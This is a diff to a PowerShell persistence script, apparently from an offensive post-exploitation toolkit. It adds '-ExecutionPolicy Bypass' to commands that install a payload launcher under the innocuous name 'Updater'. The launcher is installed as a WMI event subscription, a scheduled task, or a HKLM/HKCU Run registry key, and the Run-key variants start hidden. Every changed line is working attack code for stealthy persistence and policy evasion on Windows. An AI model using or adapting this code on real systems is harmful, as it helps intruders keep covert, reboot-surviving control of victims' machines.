@@ -542,12 +542,12 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
             {
                 'AtStartup'
                 {
-                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
+                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                 }
 
                 'Daily'
                 {
-                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ElevatedPersistenceOption.Time.ToString('HH')) AND TargetInstance.Minute = $($ElevatedPersistenceOption.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
+                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ElevatedPersistenceOption.Time.ToString('HH')) AND TargetInstance.Minute = $($ElevatedPersistenceOption.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                 }
 
                 default
@@ -559,7 +559,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
 
         'ScheduledTask'
         {
-            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
+            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass`"'
             $ElevatedTriggerRemoval = "schtasks /Delete /TN Updater"
 
             switch ($ElevatedPersistenceOption.Trigger)
@@ -592,7 +592,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
         {
             $ElevatedTrigger = "New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
             $ElevatedTriggerRemoval = "Remove-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
-            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
+            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass`""
             $ElevatedTrigger = "'" + $ElevatedTrigger + $CommandLine + "'"
         }
 
@@ -607,7 +607,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
     {
         'ScheduledTask'
         {
-            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
+            $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass`"'
             $UserTriggerRemoval = "schtasks /Delete /TN Updater"
 
             switch ($UserPersistenceOption.Trigger)
@@ -635,7 +635,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
         {
             $UserTrigger = "New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
             $UserTriggerRemoval = "Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
-            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
+            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass`""
             $UserTrigger = "'" + $UserTrigger + $CommandLine + "'"
         }
 
